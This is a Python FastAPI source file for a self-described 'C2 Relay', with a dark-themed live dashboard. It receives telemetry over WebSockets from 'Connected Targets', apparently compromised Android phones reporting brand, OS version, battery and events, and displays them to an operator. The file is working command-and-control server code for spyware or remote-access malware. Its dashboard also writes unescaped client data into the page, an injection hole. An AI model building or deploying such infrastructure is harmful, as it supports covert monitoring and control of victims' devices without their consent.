from fastapi import FastAPI, WebSocket, WebSocketDisconnect
from fastapi.responses import HTMLResponse
import json

app = FastAPI(title="Tsukuyomi C2 Relay")

# Store connected clients and active telemetry state
connected_clients = {}
client_data = {}
dashboard_connections = []

@app.get("/", response_class=HTMLResponse)
async def get_dashboard():
    # Pro-level Dark Theme Live Monitoring Dashboard UI
    return """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Tsukuyomi C2 Dashboard</title>
        <style>
            body { background-color: #0a0d14; color: #00f0ff; font-family: monospace; padding: 20px; }
            h1 { color: #ff0055; text-shadow: 0 0 10px rgba(255,0,85,0.4); }
            .card { background: #121824; padding: 15px; border-radius: 8px; border: 1px solid #1e293b; margin-bottom: 10px; box-shadow: 0 4px 6px rgba(0,0,0,0.3); }
            .status { color: #00ff88; font-weight: bold; }
            .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 15px; margin-top: 20px; }
        </style>
    </head>
    <body>
        <h1>TSUKUYOMI C2 RELAY DASHBOARD</h1>
        <p>Status: <span class="status">ONLINE (FastAPI WebSocket Engine)</span></p>
        <h3>Connected Targets:</h3>
        <div id="device-grid" class="grid">Waiting for incoming client connections...</div>

        <script>
            const ws = new WebSocket((location.protocol === 'https:' ? 'wss://' : 'ws://') + location.host + '/ws/dashboard');
            ws.onmessage = function(event) {
                const data = JSON.parse(event.data);
                const grid = document.getElementById('device-grid');
                
                let html = '';
                for (const [id, info] of Object.entries(data)) {
                    html += `
                        <div class="card">
                            <p><b>Device ID:</b> ${id}</p>
                            <p><b>Brand / Model:</b> ${info.brand || 'Unknown'}</p>
                            <p><b>OS Version:</b> Android ${info.os || 'N/A'}</p>
                            <p><b>Battery:</b> ${info.battery || 'N/A'}%</p>
                            <p><b>Last Event:</b> ${info.event || 'None'}</p>
                        </div>
                    `;
                }
                grid.innerHTML = html || 'No active targets connected.';
            };
        </script>
    </body>
    </html>
    """

@app.websocket("/ws/client/{client_id}")
async def websocket_client(websocket: WebSocket, client_id: str):
    await websocket.accept()
    connected_clients[client_id] = websocket
    print(f"[+] Client Connected: {client_id}")
    try:
        while True:
            data = await websocket.receive_text()
            parsed = json.loads(data)
            client_data[client_id] = parsed
            print(f"[{client_id}] Telemetry: {parsed}")
            
            # Broadcast latest data to all active dashboards
            await broadcast_to_dashboards()
    except WebSocketDisconnect:
        if client_id in connected_clients:
            del connected_clients[client_id]
        if client_id in client_data:
            del client_data[client_id]
        print(f"[-] Client Disconnected: {client_id}")
        await broadcast_to_dashboards()

@app.websocket("/ws/dashboard")
async def websocket_dashboard(websocket: WebSocket):
    await websocket.accept()
    dashboard_connections.append(websocket)
    try:
        # Send current state instantly upon opening dashboard
        await websocket.send_text(json.dumps(client_data))
        while True:
            await websocket.receive_text()
    except WebSocketDisconnect:
        dashboard_connections.remove(websocket)

async def broadcast_to_dashboards():
    payload = json.dumps(client_data)
    for dash in dashboard_connections:
        try:
            await dash.send_text(payload)
        except:
            pass
